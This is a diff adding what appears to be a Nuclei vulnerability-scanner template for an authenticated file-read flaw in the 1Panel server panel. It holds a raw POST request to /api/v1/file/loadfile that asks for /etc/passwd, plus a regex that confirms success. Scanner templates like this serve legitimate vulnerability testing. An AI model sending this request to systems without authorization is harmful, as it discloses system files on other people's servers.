@@ -1,0 +1,24 @@
+id: 1panel-loadfile-fileread
+
+info:
+  name: 1Panel loadfile 后台文件读取漏洞
+  author: SleepingBag945
+  severity: high
+
+http:
+  - raw:
+      - |
+        POST /api/v1/file/loadfile HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json; charset=utf-8
+
+        {"path":"/etc/passwd"}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
